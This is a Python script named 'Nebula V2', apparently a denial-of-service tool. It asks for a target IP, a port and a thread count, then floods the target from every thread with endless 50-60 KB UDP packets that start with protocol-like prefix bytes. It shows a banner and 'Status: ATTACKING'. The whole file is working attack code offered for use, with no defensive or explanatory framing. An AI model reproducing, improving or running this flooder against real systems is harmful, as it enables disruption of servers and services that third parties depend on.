import socket
import time
import sys
import threading
import os
import random
import zlib
# Nebula V2

def nebula(target_ip, target_port):
  target = (target_ip, target_port)
  pids = [
    b'\x05'
    b'\xfe'
    b'\x01'
    b'\x07'
    b'\x84'
    b'\x13'
    b'\x11'
    b'\x00'
    b'\x80'
  ]
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload_len = random.randint(50000, 60000)
    raw1 = os.urandom(payload_len)
    pid = random.choice(pids)
    raw2 = b"L"*1024
    compressed = zlib.compress(raw2, level=9)
    payload = pid + compressed + raw1
    for i in range(500):
      s.sendto(payload, target)
    s.close()

banner = """

   ▄▄     ▄▄▄                ▄▄
   ██▄   ██▀      █▄          ██
   ███▄  ██       ██          ██
   ██ ▀█▄██ ▄█▀█▄ ████▄ ██ ██ ██ ▄▀▀█▄
   ██   ▀██ ██▄█▀ ██ ██ ██ ██ ██ ▄█▀██
 ▀██▀    ██▄▀█▄▄▄▄████▀▄▀██▀█▄██▄▀█▄██

[ @n0isemc ]           [ Version 2.0 ]
"""

os.system("clear")
print("\033[31m" + banner)
print(" ")
time.sleep(1)
target_ip = input("\033[34mTarget IP: ")
target_port = int(input("Target Port: "))
threads = int(input("Threads: "))
print(" ")
print("Please Wait... (threads loading...)")

for i in range(threads):
  t = threading.Thread(target=nebula,args=(target_ip, target_port), daemon=True)
  t.start()

print("\033[31m" + banner)
print(" ")
print("[!] Attack Started")
print(" ")
print(f"\033[34mTarget IP: {target_ip}")
print(f"Target Port: {target_port}")
print(f"Threads: {threads}")
print("Status: ATTACKING")
print(" ")
print("\033[31m[!] Use CTRL+C For Stop.")

while True:
  time.sleep(1)


